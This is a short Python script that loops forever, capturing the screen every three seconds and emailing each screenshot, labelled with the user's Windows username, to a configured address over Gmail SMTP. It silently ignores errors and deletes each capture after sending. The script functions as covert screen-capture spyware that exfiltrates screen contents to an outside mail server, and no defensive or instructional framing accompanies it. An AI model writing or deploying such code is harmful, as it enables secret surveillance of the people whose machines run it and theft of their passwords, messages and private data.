# 7 August 2020
from pyautogui import screenshot
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
from time import sleep

x = 0
username = os.environ.get("USERNAME")
shot_path = "shot.png"
while True:
    try:
        screenshot().save(shot_path)
        fromaddr = "E-mail Adress"
        toaddr = fromaddr
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = username
        body = "Hello"
        msg.attach(MIMEText(body, 'plain'))
        filename = "shot.png"
        attachment = open(shot_path, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, "Your Password of E-mail")
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
        attachment.close()
        os.remove(shot_path)
    except:
        pass
    finally:
        x += 1
        print(x)
        sleep(3)
